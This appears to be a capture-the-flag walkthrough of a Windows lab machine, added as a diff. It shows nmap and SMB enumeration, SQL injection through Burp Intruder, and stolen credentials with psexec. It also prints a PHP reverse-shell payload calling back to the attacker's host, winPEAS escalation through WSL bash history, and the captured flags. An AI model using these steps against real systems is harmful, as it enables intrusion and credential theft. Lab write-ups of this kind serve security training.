@@ -1,0 +1,110 @@
+We start with a scan : nmap -p- --min-rate 5000 -sC -sV (target ip)
+
+We see three tcp ports are up which are 80,445, and 8808.
+
+We recoginze that 445/tcp is a SMB protocol. We try to exploit that first by trying to have access without a password using smbclient tool: smbclient -N -L \\\\(target ip)\\
+
+This didnt work. We will leave it for later.
+
+80/tcp is a website. Indeed, if we searched our target ip:80 in a search engine. We will be welcomed with a website login form. We can try SQL injection on it. We will leave that aside for now.
+
+We can create an account and login so we can see what other pages this website has.
+
+We login. We see four buttons that we can click on. New Note, Change Password, Signout, and Contact Us.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Using Burp Suite:
+
+We turn on foxy proxy, and we start Burp Suite.
+
+But before that, we need to try SQL injection in the signup page. We try this sqli:'OR 1 OR' as username and password.
+
+In Burp Suite we get this POST request. We send the request to introder. In introder, we only highlight the url code that is next to username,password,and confirm password. We click add.
+
+We then go to payloads. In Payload settings, we can add sqli arguments one by one.
+
+I used this Github repository for sqli: https://github.com/payloadbox/sql-injection-payload-list
+
+We start attack. We get some good results as http response 200.
+
+We try to login with all of the sqli for credentials. ('OR 1 OR') works. We see that others has signed up using these credentials. 
+
+We see something interesting. It seems like there are credentials stored in one of the notes for whoever is running this website: tyler:92g!mA8BGjOirkL%OG*&
+
+We will try to use psexec.py that is in impacket tool. We change our directory to the psexec file. Then: python3 psexec.py (username):'password'@(target ip) 
+
+This failes, however, now we know that tyler is not admin but he has access to a directory called new-site which we will try to access using SMB.
+
+We use SMB: smbclient \\\\(target ip)\\new-site -U tyler. We will provide the password that we got.
+
+We are in.
+
+We do ls and we see two files isstart.htm and isstart.png . This means there is a website that uses windows iss . In our nmap scan, we get a port that is open on 8808/tcp. We try to google (target ip):8808. This will lead us to a home page of a website. We inspect the picture and indeed it is called isstart.png.
+
+We will use netcat to gain access to smb. This will require us to put a file called nc.exe.
+
+First, we locate the file by: locate nc.exe. We copy the path and do(while we are in root): cp (nc.exe path) nc.exe. This will copy the nc.exe file under the same name in root.
+
+In the smb, we do: put nc.exe.
+
+We need to create a php file that has the following code: <?php
+
+system('nc.exe -e cmd.exe (our ip address) 4444');
+
+ ?>
+
+ This will allow us to run netcat on the target machine and be listining on port 4444.
+
+ We upload the php file that we created: put rev.php
+
+ On our machine, we start a netcat listener on port 4444: nc -nvlp 4444.
+
+ We go back to the website and in the url we type: (target ip):8809/rev.php . This will run the php file . 
+
+ Note: if that didnt work, make sure that both of the files that we uploaded are still there, if not upload them again.
+
+ If we go back to our cmd tab where we ran netcat, we can see that we have access to the machine.
+
+ /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+ Escalation via WSL:
+
+ We will use winPease for this way.
+
+ We upload winPease to the machine.
+
+ We run winPease : .\winPease.exe <--This is the name that I gave it to the winPease file that I uploaded.
+
+ At the very end of the winPease output, we see something that looks vulnerable. We have access to the wsl files.
+
+ We change our directory to: C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root .
+
+ There, if we listed the files, we can see the history of bash command prompt. This might has useful info.
+
+ Indeed, if we revealed what this file has, we see something very interesting, we found the username and password of admin: administrator:u6!4ZwgwOM#^OBf#Nwnh.
+
+ This is great. Now, we just can use psexec.py in Impaket to login as administrator.
+
+ In our machine we change directory where psexec.py is located and we do the following: python3 psexec.py (username)@(target ip).
+
+ Then, we provide the password.
+
+ We are in as administrator.
+
+ user flag:db351be7fd82eee96260bf592f0265ef
+
+ Admin flag:c46b65d0219f9e9256cbb8cf5e693057
+
+ //END
+
+
+
+
+ 
+
+
+
+
+
+
